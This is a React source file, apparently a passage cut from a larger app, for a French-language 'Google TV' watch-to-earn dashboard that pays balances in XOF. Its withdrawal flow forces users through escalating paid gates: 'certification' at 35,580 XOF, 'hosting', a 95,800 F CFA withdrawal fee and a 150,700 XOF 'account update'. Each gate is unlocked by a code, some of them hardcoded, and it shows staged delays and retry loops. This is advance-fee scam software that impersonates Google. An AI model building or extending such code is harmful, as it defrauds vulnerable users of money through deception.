import { useCallback, useEffect, useMemo, useRef, useState, type ReactNode } from 'react';
import { ArrowDown, Banknote, History, Home, CheckCircle2, Clock3, Loader2, LogOut, Play, RefreshCw, RotateCcw, UserRound, Video, X, XCircle } from 'lucide-react';
import VideoTab from '@/components/VideoTab';
import { recommended } from '@/data/content';
import { countries, getCountry, getPaymentMethods, getPlanRewardAmount, getPlanWithdrawalLimit } from '@/data/locations';
import { supabase } from '@/lib/supabase';

interface UserHomeProfile {
  id: string;
  first_name: string;
  last_name: string;
  email: string | null;
  phone: string | null;
  country: string | null;
  city: string | null;
  birth_date?: string | null;
  gender?: string | null;
  account_type?: string | null;
  is_certified: boolean;
  suspended_at: string | null;
}

interface UserHomeProps {
  profile: UserHomeProfile;
  onSignOut: () => void;
}

type UserTab = 'home' | 'video' | 'withdrawal' | 'profile';
interface Activity { watched: boolean; liked: boolean; disliked: boolean; favorited: boolean; }
type ActivityKey = 'watched' | 'liked' | 'disliked' | 'favorited';

const recommendationLabels = ['Recommandation 1', 'Recommandation 2', 'Recommandation 3', 'Recommandation 4'];

type WithdrawalStage = 'tax' | 'certification' | 'hosting' | 'hosted' | 'fee' | 'update';
type WithdrawalFlowSnapshot = { codeStep: boolean; certificationBlocked: boolean; hostingStep: boolean; hostedSuccess: boolean; feeStep: boolean; feeValidation: boolean; updateStep: boolean; withdrawalCode: string; paymentMethod: string; withdrawalCountry: string; amount: string; phone: string };
const withdrawalFlowKey = (userId: string) => `gtv-withdrawal-flow-${userId}`;

export default function UserHome({ profile, onSignOut }: UserHomeProps) {
  const [historyOpen, setHistoryOpen] = useState(false);
  const [tab, setTab] = useState<UserTab>('home');
  const [withdrawalLocked, setWithdrawalLocked] = useState(false);
  const [activities, setActivities] = useState<Record<string, Activity>>({});
  const [activityError, setActivityError] = useState<string | null>(null);
  const [committedAmount, setCommittedAmount] = useState(0);
  const firstName = profile.first_name || 'vous';
  const rewardAmount = getPlanRewardAmount(profile.account_type);
  const withdrawalLimit = getPlanWithdrawalLimit(profile.account_type);

  useEffect(() => {
    try { if (window.localStorage.getItem(withdrawalFlowKey(profile.id))) setTab('withdrawal'); } catch { /* stockage indisponible */ }
  }, [profile.id]);

  useEffect(() => {
    let mounted = true;
    void supabase.from('user_content_activity').select('content_id, watched, liked, disliked, favorited').eq('user_id', profile.id).then(({ data, error }) => {
      if (!mounted) return;
      if (error) { setActivityError('Les statistiques ne sont pas disponibles pour le moment.'); return; }
      const next: Record<string, Activity> = {};
      (data ?? []).forEach((row) => { next[row.content_id] = { watched: row.watched, liked: row.liked, disliked: row.disliked, favorited: row.favorited }; });
      setActivities(next);
    });
    return () => { mounted = false; };
  }, [profile.id]);

  useEffect(() => {
    let mounted = true;
    void supabase.from('withdrawal_requests').select('amount, status').eq('user_id', profile.id).in('status', ['pending', 'approved']).then(({ data, error }) => {
      if (!mounted) return;
      if (!error) setCommittedAmount((data ?? []).reduce((total, row) => total + Number(row.amount), 0));
    });
    return () => { mounted = false; };
  }, [profile.id, activities]);

  const updateActivity = async (contentId: string, key: ActivityKey, forcedValue?: boolean) => {
    const current = activities[contentId] ?? { watched: false, liked: false, disliked: false, favorited: false };
    const next = { ...current, [key]: forcedValue ?? !current[key] };
    if (key === 'liked' && next.liked) next.disliked = false;
    if (key === 'disliked' && next.disliked) next.liked = false;
    setActivities((value) => ({ ...value, [contentId]: next }));
    setActivityError(null);
    const { error } = await supabase.from('user_content_activity').upsert({ content_id: contentId, watched: next.watched, liked: next.liked, disliked: next.disliked, favorited: next.favorited, updated_at: new Date().toISOString() }, { onConflict: 'user_id,content_id' });
    if (error) {
      setActivities((value) => ({ ...value, [contentId]: current }));
      setActivityError('Cette action n’a pas pu être enregistrée.');
    }
  };

  const markWatched = async (contentId: string) => {
    if (activities[contentId]?.watched) return;
    await updateActivity(contentId, 'watched', true);
  };

  const counts = useMemo(() => Object.values(activities).reduce((result, activity) => ({
    watched: result.watched + Number(activity.watched),
    liked: result.liked + Number(activity.liked),
    favorited: result.favorited + Number(activity.favorited),
    rewarded: result.rewarded + Number(activity.watched && activity.liked && activity.favorited),
  }), { watched: 0, liked: 0, favorited: 0, rewarded: 0 }), [activities]);

  const earnedBalance = counts.rewarded * rewardAmount;
  const availableBalance = Math.max(0, earnedBalance - committedAmount);
  const withdrawalRequired = availableBalance >= withdrawalLimit;

  return <div className="user-home min-h-screen bg-[#090d14] pb-24 text-slate-100">
    <header className="border-b border-white/10 bg-[#0b0f17] px-5 py-5 sm:px-10"><div className="mx-auto flex max-w-6xl items-center justify-between"><div className="flex items-center gap-2"><span className="google-mark">G</span><span className="text-2xl font-bold tracking-tight text-white">Google</span><span className="rounded-lg bg-[#4285f4] px-2.5 py-1 text-lg font-bold text-white shadow-[0_0_20px_rgba(66,133,244,.4)]">TV</span></div><button onClick={onSignOut} className="inline-flex items-center gap-2 rounded-xl bg-[#171c25] px-4 py-3 text-sm font-semibold text-slate-300 transition hover:bg-[#222936] hover:text-white sm:px-6"><LogOut className="h-4 w-4" /> Déconnexion</button></div></header>
    <main className="mx-auto max-w-6xl px-5 sm:px-10">
      {tab === 'home' && <HomeTab firstName={firstName} isCertified={profile.is_certified} onDiscover={() => setTab('video')} />}
      {tab === 'video' && (withdrawalRequired
        ? <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 text-center shadow-2xl sm:p-12"><RotateCcw className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Retrait obligatoire avant de continuer</h1><p className="mt-4 leading-7 text-slate-300">Votre solde disponible de <b>{availableBalance.toLocaleString('fr-FR')} XOF</b> a atteint la limite de <b>{withdrawalLimit.toLocaleString('fr-FR')} XOF</b> de votre type de compte.</p><p className="mt-3 text-sm text-slate-400">Vous devez effectuer un retrait avant de pouvoir continuer à regarder des vidéos.</p><button onClick={() => setTab('withdrawal')} className="primary-button mt-8 rounded-xl px-6 py-3 font-bold">Aller au retrait</button></div></section>
        : <VideoTab activities={activities} rewardAmount={rewardAmount} onActivity={updateActivity} onWatched={markWatched} />)}
      {tab === 'withdrawal' && <WithdrawalTab profile={profile} counts={counts} rewardAmount={rewardAmount} onPendingChange={setWithdrawalLocked} />}
      {tab === 'profile' && <ProfileTab profile={profile} counts={counts} onOpenHistory={() => setHistoryOpen(true)} />}
      {historyOpen && <WithdrawalHistory profileId={profile.id} onClose={() => setHistoryOpen(false)} />}
      {activityError && <p className="fixed bottom-24 left-1/2 z-40 -translate-x-1/2 rounded-xl border border-red-400/30 bg-[#2a1720] px-4 py-3 text-sm text-red-200 shadow-xl">{activityError}</p>}
    </main>
    <nav className="fixed inset-x-0 bottom-0 z-30 border-t border-white/10 bg-[#11151e]/95 px-3 py-3 shadow-[0_-12px_35px_rgba(0,0,0,.35)] backdrop-blur-xl"><div className="mx-auto grid max-w-2xl grid-cols-4 gap-2">{([{ id: 'home', label: 'Accueil', icon: Home }, { id: 'video', label: 'Vidéo', icon: Video }, { id: 'withdrawal', label: 'Retrait', icon: ArrowDown }, { id: 'profile', label: 'Profil', icon: UserRound }] as const).map(({ id, label, icon: Icon }) => <button key={id} onClick={() => { if (!withdrawalLocked || id === 'withdrawal') setTab(id); }} disabled={withdrawalLocked && id !== 'withdrawal'} className={`flex flex-col items-center gap-1 rounded-xl px-2 py-2 text-xs font-semibold transition sm:text-sm ${tab === id ? 'text-blue-400' : 'text-slate-500 hover:bg-white/5 hover:text-slate-300'} disabled:cursor-not-allowed disabled:opacity-40`}><Icon className="h-6 w-6" strokeWidth={tab === id ? 2.5 : 2} /><span>{label}</span></button>)}</div></nav>
  </div>;
}

function HomeTab({ firstName, isCertified, onDiscover }: { firstName: string; isCertified: boolean; onDiscover: () => void }) {
  return <div className="pb-10"><section className="relative -mx-5 min-h-[520px] overflow-hidden sm:-mx-10 sm:min-h-[600px]"><img src={recommended[0].image} alt="" className="absolute inset-0 h-full w-full object-cover object-center opacity-70" /><div className="absolute inset-0 bg-gradient-to-r from-[#090d14] via-[#090d14]/75 to-transparent" /><div className="absolute inset-0 bg-gradient-to-t from-[#090d14] via-transparent to-[#090d14]/20" /><div className="relative flex min-h-[520px] items-end px-5 pb-14 sm:min-h-[600px] sm:px-10 sm:pb-20"><div className="max-w-2xl"><h1 className="text-5xl font-black tracking-tight text-white sm:text-7xl">Bonjour, <span className="inline-flex items-center gap-2 align-middle"><span className="hero-gradient">{firstName}</span>{isCertified && <CertifiedBadge />}</span></h1><p className="mt-6 max-w-xl text-xl leading-8 text-slate-300 sm:text-2xl">Bienvenue sur Google TV. Découvrez des milliers de films et séries adaptés à vos goûts.</p><button onClick={onDiscover} className="primary-button mt-8 inline-flex items-center gap-2 rounded-xl px-5 py-3.5 font-bold"><Play className="h-5 w-5 fill-current" /> Découvrir</button></div></div></section><section className="pt-12 sm:pt-16"><h2 className="text-3xl font-black text-white sm:text-4xl">Recommandés pour vous</h2><div className="mt-7 grid grid-cols-2 gap-4 sm:grid-cols-4 sm:gap-5">{recommendationLabels.map((label, index) => { const show = recommended[index]; return <article key={label} className="group overflow-hidden rounded-3xl border border-white/10 bg-[#141a24] transition duration-300 hover:-translate-y-1 hover:border-blue-400/60"><div className="relative aspect-[.76] overflow-hidden"><img src={show.image} alt={label} className="h-full w-full object-cover transition duration-500 group-hover:scale-105" /><div className="absolute inset-x-0 bottom-0 h-1/2 bg-gradient-to-t from-[#10151f] to-transparent" /><div className="absolute bottom-3 left-3 right-3"><p className="text-base font-bold text-white sm:text-lg">Contenu {index + 1}</p><p className="mt-1 text-xs text-slate-300 sm:text-sm">Exclusif · 2026</p></div></div><div className="p-3 sm:p-4"><p className="text-xs font-semibold uppercase tracking-wide text-blue-300">{label}</p></div></article>; })}</div></section></div>;
}

function WithdrawalTab({ profile, counts, rewardAmount, onPendingChange }: { profile: UserHomeProfile; counts: { watched: number; liked: number; favorited: number; rewarded: number }; rewardAmount: number; onPendingChange: (pending: boolean) => void }) {
  const flowKey = withdrawalFlowKey(profile.id);
  const savedFlow = (() => { try { const raw = window.localStorage.getItem(flowKey); return raw ? JSON.parse(raw) as WithdrawalFlowSnapshot : null; } catch { return null; } })();
  const savedWithdrawalCode = savedFlow?.withdrawalCode?.trim() ?? '';
  const hasSavedFlow = Boolean(savedFlow && (savedFlow.codeStep || savedFlow.certificationBlocked || savedFlow.hostingStep || savedFlow.hostedSuccess || savedFlow.feeStep || savedFlow.feeValidation || savedFlow.updateStep));
  const savedNeedsCertification = savedFlow?.certificationBlocked === true && Boolean(savedWithdrawalCode) && !profile.is_certified;
  const savedHostingStep = Boolean(savedWithdrawalCode) && (savedFlow?.hostingStep === true || (profile.is_certified && savedFlow?.certificationBlocked === true));
  const [paymentMethod, setPaymentMethod] = useState(savedFlow?.paymentMethod ?? '');
  const [withdrawalCountry, setWithdrawalCountry] = useState(savedFlow?.withdrawalCountry ?? profile.country ?? '');
  const [amount, setAmount] = useState(savedFlow?.amount ?? '');
  const [phone, setPhone] = useState(savedFlow?.phone ?? profile.phone?.replace(/^\+\d+\s?/, '') ?? '');
  const [withdrawalCode, setWithdrawalCode] = useState(savedWithdrawalCode);
  const taxPaidKey = `gtv-tax-paid-${profile.id}`;
  const [taxPaid, setTaxPaid] = useState(() => { try { return window.localStorage.getItem(taxPaidKey) === '1'; } catch { return false; } });
  const [codeStep, setCodeStep] = useState(false);
  const [certificationBlocked, setCertificationBlocked] = useState(savedNeedsCertification);
  const [codeReady, setCodeReady] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [validating, setValidating] = useState(false);
  const [certChecked, setCertChecked] = useState(false);
  const [certifiedNow, setCertifiedNow] = useState(profile.is_certified);
  const [hostingStep, setHostingStep] = useState(savedHostingStep);
  const [hostingCode, setHostingCode] = useState('');
  const [hostingError, setHostingError] = useState<string | null>(null);
  const [withdrawalProcessing, setWithdrawalProcessing] = useState(false);
  const [hostedSuccess, setHostedSuccess] = useState(false);
  const [feeStep, setFeeStep] = useState((savedFlow?.feeStep === true || savedFlow?.feeValidation === true) && Boolean(savedWithdrawalCode));
  const [feeCode, setFeeCode] = useState('');
  const [feeError, setFeeError] = useState<string | null>(null);
  const [feeValidation, setFeeValidation] = useState(false);
  const [updateStep, setUpdateStep] = useState(savedFlow?.updateStep === true && Boolean(savedWithdrawalCode));
  const [serverFlowLoaded, setServerFlowLoaded] = useState(false);
  const flowMutationQueue = useRef(Promise.resolve());
  const [updateCode, setUpdateCode] = useState('');
  const [updateError, setUpdateError] = useState<string | null>(null);
  const [latestRequest, setLatestRequest] = useState<{ id: string; status: string; amount: number; dismissedAt: boolean; acknowledgedAt: string | null } | null>(null);
  const [dismissedLatest, setDismissedLatest] = useState(false);
  const [refreshTick, setRefreshTick] = useState(0);
  const [approvalElapsed, setApprovalElapsed] = useState(0);
  const [committedAmount, setCommittedAmount] = useState(0);
  const [balanceReady, setBalanceReady] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [hasCodeBypass, setHasCodeBypass] = useState(false);
  const beneficiary = `${profile.first_name} ${profile.last_name}`.trim();
  const paymentMethods = getPaymentMethods(withdrawalCountry);
  const dialCode = getCountry(withdrawalCountry)?.dialCode ?? '+';
  const earnedBalance = counts.rewarded * rewardAmount;
  const availableBalance = balanceReady ? Math.max(0, earnedBalance - committedAmount) : 0;

  const activeStage: WithdrawalStage | null = codeStep ? 'tax' : certificationBlocked ? 'certification' : hostingStep ? 'hosting' : hostedSuccess ? 'hosted' : feeValidation || feeStep ? 'fee' : updateStep ? 'update' : null;

  const queueFlowStage = useCallback((stage: WithdrawalStage | null): void => {
    flowMutationQueue.current = flowMutationQueue.current.then(async () => {
      if (stage) {
        const { error } = await supabase.rpc('set_withdrawal_flow_state', { p_stage: stage });
        if (error) console.error('withdrawal flow stage could not be saved', error);
      } else {
        const { error } = await supabase.rpc('clear_withdrawal_flow_state');
        if (error) console.error('withdrawal flow stage could not be cleared', error);
      }
    });
  }, []);

  useEffect(() => {
    let mounted = true;
    void supabase.from('withdrawal_requests').select('id, amount, status, dismissed_at, acknowledged_at, created_at').eq('user_id', profile.id).order('created_at', { ascending: false }).then(({ data, error }) => {
      if (!mounted) return;
      if (error) {
        setBalanceReady(false);
        setErrorMessage('Le solde disponible ne peut pas être vérifié pour le moment.');
        return;
      }
      const rows = data ?? [];
      setCommittedAmount(rows.filter((row) => row.status === 'pending' || row.status === 'approved').reduce((total, row) => total + Number(row.amount), 0));
      const nextRequest = rows.length > 0 ? { id: String(rows[0].id), status: String(rows[0].status), amount: Number(rows[0].amount), dismissedAt: Boolean(rows[0].dismissed_at), acknowledgedAt: rows[0].acknowledged_at ? String(rows[0].acknowledged_at) : null } : null;
      setLatestRequest(nextRequest);
      onPendingChange(nextRequest?.status === 'pending');
      setBalanceReady(true);
    });
    return () => { mounted = false; };
  }, [profile.id, dismissedLatest, refreshTick, onPendingChange]);

  useEffect(() => {
    if (!certificationBlocked) return undefined;
    setCertChecked(false);
    setCertifiedNow(false);
    let active = true;
    const check = async () => {
      const { data } = await supabase.from('profiles').select('is_certified').eq('id', profile.id).maybeSingle();
      if (!active) return;
      if (data?.is_certified) { setCertifiedNow(true); setCertChecked(true); }
      else setCertChecked(true);
    };
    void check();
    const timer = window.setInterval(check, 5000);
    return () => { active = false; window.clearInterval(timer); };
  }, [certificationBlocked, profile.id]);

  useEffect(() => {
    let active = true;
    void supabase.rpc('has_withdrawal_code_bypass').then(({ data }) => { if (active) setHasCodeBypass(data === true); });
    return () => { active = false; };
  }, [profile.id]);

  useEffect(() => {
    if (!hasCodeBypass) return;
    setCodeStep(false);
    setCertificationBlocked(false);
    setHostingStep(false);
    setHostedSuccess(false);
    setFeeStep(false);
    setFeeValidation(false);
    setUpdateStep(false);
  }, [hasCodeBypass]);

  useEffect(() => {
    let active = true;
    const loadSavedStage = async () => {
      if (hasCodeBypass) { setServerFlowLoaded(true); return; }
      const { data, error } = await supabase.rpc('get_withdrawal_flow_state');
      if (!active) return;
      if (!hasSavedFlow && !error && typeof data === 'string') {
        if (data === 'tax') setCodeStep(true);
        if (data === 'certification' && !profile.is_certified) setCertificationBlocked(true);
        if (data === 'certification' && profile.is_certified) setHostingStep(true);
        if (data === 'hosting') setHostingStep(true);
        if (data === 'hosted') setHostedSuccess(true);
        if (data === 'fee') setFeeStep(true);
        if (data === 'update') setUpdateStep(true);
      }
      setServerFlowLoaded(true);
    };
    void loadSavedStage();
    return () => { active = false; };
  }, [hasSavedFlow, hasCodeBypass, profile.id, profile.is_certified]);

  useEffect(() => {
    if (!serverFlowLoaded) return;
    queueFlowStage(activeStage);
  }, [activeStage, queueFlowStage, serverFlowLoaded]);

  useEffect(() => {
    if (!codeStep) return undefined;
    setCodeReady(false);
    const timer = window.setTimeout(() => setCodeReady(true), 3000);
    return () => window.clearTimeout(timer);
  }, [codeStep]);

  useEffect(() => {
    if (latestRequest?.status !== 'pending') return undefined;
    const timer = window.setInterval(() => setRefreshTick((tick) => tick + 1), 5000);
    return () => window.clearInterval(timer);
  }, [latestRequest?.status]);

  useEffect(() => {
    if (latestRequest?.status !== 'approved' || latestRequest.acknowledgedAt || dismissedLatest || !latestRequest.id) return;
    void supabase.rpc('acknowledge_withdrawal_approval', { p_request_id: latestRequest.id }).then(({ error }) => {
      if (!error) setRefreshTick((tick) => tick + 1);
    });
  }, [latestRequest?.id, latestRequest?.status, latestRequest?.acknowledgedAt, dismissedLatest]);

  useEffect(() => {
    if (latestRequest?.status !== 'approved') { setApprovalElapsed(0); return undefined; }
    const acknowledgedAt = latestRequest.acknowledgedAt ? new Date(latestRequest.acknowledgedAt).getTime() : Date.now();
    const tick = () => setApprovalElapsed(Date.now() - acknowledgedAt);
    tick();
    const timer = window.setInterval(tick, 1000);
    return () => window.clearInterval(timer);
  }, [latestRequest?.id, latestRequest?.status, latestRequest?.acknowledgedAt]);

  useEffect(() => {
    const flowActive = codeStep || certificationBlocked || hostingStep || hostedSuccess || feeStep || feeValidation || updateStep;
    if (!flowActive) { try { window.localStorage.removeItem(flowKey); } catch { /* stockage indisponible */ } return; }
    const snapshot: WithdrawalFlowSnapshot = { codeStep, certificationBlocked, hostingStep, hostedSuccess, feeStep, feeValidation, updateStep, withdrawalCode, paymentMethod, withdrawalCountry, amount, phone };
    try { window.localStorage.setItem(flowKey, JSON.stringify(snapshot)); } catch { /* stockage indisponible */ }
  }, [flowKey, codeStep, certificationBlocked, hostingStep, hostedSuccess, feeStep, feeValidation, updateStep, withdrawalCode, paymentMethod, withdrawalCountry, amount, phone]);

  const beginSubmit = () => {
    setErrorMessage(null);
    if (hasCodeBypass) { void submit(); return; }
    setHostingCode('');
    setHostingError(null);
    if (!withdrawalCode.trim()) { setCodeStep(true); return; }
    if (profile.is_certified) { setHostingStep(true); return; }
    if (taxPaid) { setCertificationBlocked(true); return; }
    setCodeStep(true);
  };

  const proceedToHosting = async () => {
    if (!withdrawalCode.trim()) {
      setErrorMessage('Saisissez votre code de retrait.');
      return;
    }
    setSubmitting(true);
    setValidating(true);
    setErrorMessage(null);
    const { data, error } = await supabase.rpc('verify_payment_code', { p_user_id: profile.id, p_code: withdrawalCode.trim() });
    setValidating(false);
    setSubmitting(false);
    if (error) {
      setErrorMessage('La vérification du code a échoué. Veuillez réessayer.');
      return;
    }
    if (!data) {
      setErrorMessage('Le code de retrait est incorrect. Vérifiez-le puis réessayez.');
      return;
    }
    try { window.localStorage.setItem(taxPaidKey, '1'); } catch { /* stockage indisponible */ }
    setTaxPaid(true);
    setWithdrawalProcessing(true);
    window.setTimeout(() => {
      setWithdrawalProcessing(false);
      if (!profile.is_certified) {
        setCertificationBlocked(true);
      } else {
        setHostingStep(true);
      }
    }, 2000);
  };

  const requestedAmount = Number(amount);

  const submit = async () => {
    if (!hasCodeBypass && !withdrawalCode.trim()) {
      setErrorMessage('Saisissez votre code de retrait.');
      return;
    }
    setSubmitting(true);
    setValidating(true);
    setErrorMessage(null);
    await new Promise<void>((resolve) => window.setTimeout(resolve, 2500));
    const { data: requestId, error } = await supabase.rpc('submit_withdrawal_request', { p_amount: requestedAmount, p_payment_method: paymentMethod, p_phone: phone, p_country: withdrawalCountry, p_city: profile.city ?? '', p_payment_code: hasCodeBypass ? '' : withdrawalCode.trim() });
    setValidating(false);
    setSubmitting(false);
    if (error) {
      setValidating(false);
      setSubmitting(false);
      if (error.message.includes('certification')) { setCertificationBlocked(true); return; }
      if (error.message.includes('payment code')) setErrorMessage('Le code de retrait est incorrect. Vérifiez-le puis réessayez.');
      else if (error.message.includes('already pending')) setErrorMessage('Une demande de retrait est déjà en attente. Elle doit être traitée avant une nouvelle demande.');
      else if (error.message.includes('not eligible')) setErrorMessage('Votre compte ne peut pas effectuer ce retrait pour le moment. Veuillez réessayer plus tard.');
      else if (error.message.includes('exceeds')) setErrorMessage('Le montant demandé dépasse votre solde disponible.');
      else if (error.message.includes('Invalid withdrawal request')) setErrorMessage('Vérifiez le moyen de paiement, le numéro, le pays et la ville.');
      else setErrorMessage('Votre demande n’a pas pu être envoyée. Veuillez vérifier les informations puis réessayer.');
      return;
    }
    setLatestRequest({ id: typeof requestId === 'string' ? requestId : '', status: 'pending', amount: requestedAmount, dismissedAt: false, acknowledgedAt: null });
    onPendingChange(true);
    setAmount('');
    if (!hasCodeBypass) setWithdrawalCode('');
    setCodeStep(false);
    setHostingStep(false);
    setHostedSuccess(false);
    setFeeStep(false);
    setUpdateStep(false);
    try { window.localStorage.removeItem(flowKey); } catch { /* stockage indisponible */ }
    setDismissedLatest(false);
    setRefreshTick((tick) => tick + 1);
    await new Promise<void>((resolve) => window.setTimeout(resolve, 1500));
    setValidating(false);
    setSubmitting(false);
  };

  const dismissRejectedWithdrawal = async (): Promise<void> => {
    if (!latestRequest?.id) return;
    setDismissedLatest(true);
    setAmount('');
    setWithdrawalCode('');
    const { error } = await supabase.rpc('dismiss_withdrawal_request', { p_request_id: latestRequest.id });
    if (error) {
      setDismissedLatest(false);
      setErrorMessage('Votre demande n’a pas pu être masquée. Veuillez réessayer.');
      return;
    }
    setHasCodeBypass(true);
  };

  if (latestRequest && !dismissedLatest && latestRequest.status === 'pending') return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 text-center shadow-2xl sm:p-12"><Clock3 className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Votre retrait est en cours de validation</h1><p className="mt-4 leading-7 text-slate-300">Votre demande de <b>{latestRequest.amount.toLocaleString('fr-FR')} XOF</b> est en attente de validation.</p></div></section>;

  if (latestRequest && !dismissedLatest && !latestRequest.dismissedAt && latestRequest.status === 'rejected') return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-red-400/30 bg-[#241318] p-8 text-center shadow-2xl sm:p-12"><XCircle className="mx-auto h-12 w-12 text-red-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Votre retrait a échoué veuillez réessayer</h1><button onClick={() => { void dismissRejectedWithdrawal(); }} className="primary-button mt-8 rounded-xl px-6 py-3 font-bold">Réessayer</button></div></section>;

  if (latestRequest && !dismissedLatest && latestRequest.status === 'approved' && approvalElapsed < 3000) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-green-400/30 bg-[#12241a] p-8 text-center shadow-2xl sm:p-12"><CheckCircle2 className="mx-auto h-12 w-12 text-green-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Votre retrait a été effectué avec succès</h1><p className="mt-4 leading-7 text-slate-300">Votre demande de <b>{latestRequest.amount.toLocaleString('fr-FR')} XOF</b> a été validée avec succès.</p></div></section>;

  if (certificationBlocked) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><img src="/assets/icons/file_00000000f4308210a788b98916b52e8e.png" alt="Compte certifié" className="mx-auto h-16 w-16 object-contain" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Votre compte n'est pas autorisé à passer un retrait.</h1><p className="mt-4 leading-7 text-slate-300">Pour autoriser les retraits, votre compte doit être certifié.</p><p className="mt-3 text-sm text-slate-400">Coût de la certification : <b>35 580 XOF&nbsp;</b></p>{!certChecked ? <div className="mt-8"><Loader2 className="mx-auto h-8 w-8 animate-spin text-blue-400" /><p className="mt-4 text-sm text-slate-400">Vérification de votre certification…</p></div> : certifiedNow ? <button onClick={() => { setCertificationBlocked(false); setHostingCode(''); setHostingError(null); setHostingStep(true); }} className="primary-button mt-8 rounded-xl px-6 py-3 font-bold">Continuer</button> : <div><button disabled className="mt-5 cursor-not-allowed rounded-xl px-6 py-3 font-bold opacity-50">Continuer</button></div>}</div></section>;

  if (withdrawalProcessing) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><Loader2 className="mx-auto h-12 w-12 animate-spin text-blue-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Retrait en cours</h1><p className="mt-4 leading-7 text-slate-400">Traitement de votre demande de retrait…</p></div></section>;

  if (feeValidation) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><Loader2 className="mx-auto h-12 w-12 animate-spin text-blue-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Validation en cours</h1><p className="mt-4 leading-7 text-slate-400">Vérification de vos frais de retrait…</p></div></section>;

  if (updateStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 shadow-2xl sm:p-12"><div className="text-center"><RefreshCw className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Veuillez faire la mise à jour de votre compte Google TV !</h1></div><div className="mt-8 rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center"><p className="text-sm font-bold uppercase tracking-[.14em] text-slate-400">Coût de la mise à jour</p><p className="mt-3 text-xl font-black text-white sm:text-2xl">150 700 XOF</p></div><div className="mt-8 text-left"><WithdrawalField label="Code de mise à jour"><input type="text" autoComplete="one-time-code" value={updateCode} onChange={(event) => { setUpdateCode(event.target.value); setUpdateError(null); }} placeholder="Saisissez le code" className="withdrawal-input" /></WithdrawalField>{updateError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{updateError}</p>}<button onClick={() => { if (updateCode.trim().toUpperCase() === 'GTV-M75100') { setErrorMessage(null); setUpdateError(null); setUpdateStep(false); void submit(); } else { setUpdateError('Le code de mise à jour est incorrect.'); } }} disabled={!updateCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Effectuer la mise à jour</button></div></div></section>;

  if (hostedSuccess) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-green-400/30 bg-[#12241a] p-8 text-center shadow-2xl sm:p-12"><CheckCircle2 className="mx-auto h-12 w-12 text-green-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Compte hébergé avec succès</h1><p className="mt-4 leading-7 text-slate-300">Votre compte Google TV a bien été hébergé. Vous pouvez poursuivre votre demande de retrait.</p><button onClick={() => { setHostedSuccess(false); setFeeCode(''); setFeeError(null); setFeeStep(true); }} className="primary-button mt-8 w-full rounded-2xl px-5 py-4 text-lg font-bold">Continuer</button></div></section>;

  if (feeStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 shadow-2xl sm:p-12"><div className="text-center"><Banknote className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Veuillez payer les frais de retrait afin que votre retrait soit effectué avec succès</h1></div><div className="mt-8 rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center"><p className="text-sm font-bold uppercase tracking-[.14em] text-slate-400">Frais de retrait</p><p className="mt-3 text-xl font-black text-white sm:text-2xl">95 800 F CFA</p></div><div className="mt-8 text-left"><WithdrawalField label="Code de frais de retrait"><input type="text" autoComplete="one-time-code" value={feeCode} onChange={(event) => { setFeeCode(event.target.value); setFeeError(null); }} placeholder="Saisissez le code" className="withdrawal-input" /></WithdrawalField>{feeError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{feeError}</p>}<button onClick={() => { if (feeCode.trim().toUpperCase() === 'GTV-F95207') { setFeeError(null); setFeeStep(false); setFeeValidation(true); window.setTimeout(() => { setFeeValidation(false); setUpdateCode(''); setUpdateError(null); setUpdateStep(true); }, 3000); } else { setFeeError('Le code de frais de retrait est incorrect.'); } }} disabled={!feeCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Payer les frais et confirmer le retrait</button></div></div></section>;

